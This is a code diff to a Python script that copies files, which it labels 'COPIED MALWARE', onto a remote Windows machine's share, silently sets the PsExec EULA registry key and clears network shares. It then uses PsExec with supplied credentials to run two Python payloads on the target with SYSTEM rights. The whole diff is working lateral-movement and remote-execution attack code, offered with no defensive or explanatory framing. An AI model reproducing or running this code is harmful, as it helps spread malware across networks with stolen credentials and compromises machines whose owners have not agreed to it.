@@ -1,4 +1,5 @@
 import os
+import subprocess
 
 
 def main(ip, user, password):
@@ -8,17 +9,24 @@ def main(ip, user, password):
     print("CONNECTED")
     print(str(os.popen(r'copy ".\initiator.py" "h:\"  /Y').read()))
     print(str(os.popen(r'copy "..\FileTransfer.py" "h:\"  /Y').read()))
-    print(str(os.popen(r'copy "..\myenv" "h:\"  /Y /E').read()))
+    print(str(os.popen(r'copy ".\CreateEnv.py" "h:\"  /Y').read()))
     print("COPIED MALWARE")
-    print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
+    print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f').read()))
     os.popen('Net use * /delete /Y').read()
-    x = os.popen(r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -i -s c:/myenv/Scripts/python.exe "c:\initiator.py"')
-    print(str(x.read()))
-    x = x.close()
+    proc = subprocess.Popen(['Psexec', '\\\\' + ip, '-u', user, '-p', password, '-i', '-s', 'python', 'c:\\CreateEnv.py'], stdout=subprocess.PIPE)
+    x = proc.communicate()[0]
+    print(str(x))
+    x = proc.returncode
+    print(str(x))
     if (x == None or x == 0):
-        return True
-    else:
-        return str(x)
+        proc = subprocess.Popen(['Psexec', '\\\\' + ip, '-u', user, '-p', password, '-i', '-s', 'python', 'c:\\initiator.py'], stdout=subprocess.PIPE)
+        x = proc.communicate()[0]
+        print(str(x))
+        x = proc.returncode
+        print(str(x))
+        if (x == None or x == 0):
+            return True
+    return False
 
 
 if __name__ == '__main__':
